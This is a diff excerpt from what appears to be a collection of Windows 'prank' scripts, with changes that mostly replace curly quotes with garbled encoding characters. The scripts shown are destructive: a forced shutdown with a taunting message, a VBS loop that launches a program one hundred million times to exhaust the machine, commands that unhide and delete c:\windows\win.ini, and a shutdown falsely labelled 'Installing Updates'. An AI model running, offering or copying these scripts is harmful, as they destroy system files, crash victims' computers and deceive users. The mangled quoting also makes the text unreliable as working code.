@@ -41,7 +41,7 @@ Ipconfig /release
 
 @echo off
 msg * Lets Roll Baby
-shutdown -c “Error! Your ass got glued!” -s
+shutdown -c â€œError! You got glued!â€ -s
 
 -----------------------------
 (save as .VBS)
@@ -49,11 +49,11 @@ shutdown -c “Error! Your ass got glued!” -s
 Option Explicit
 
 Dim WSHShell
-Set WSHShell=Wscript.CreateObject(“Wscript.Shell”)
+Set WSHShell=Wscript.CreateObject(â€œWscript.Shellâ€)
 
 Dim x
 For x = 1 to 100000000
-WSHShell.Run “Tourstart.exe”
+WSHShell.Run â€œTourstart.exeâ€
 Next
 
 ------------------------
@@ -87,7 +87,7 @@ attrib -r -s -h c:\windows\win.ini
 del c:\windows\win.ini
 
 ------------------------------
-shutdown -s -t 100 c “Installing Updates”
+shutdown -s -t 100 c â€œInstalling Updatesâ€
 
 --------------------------------
 
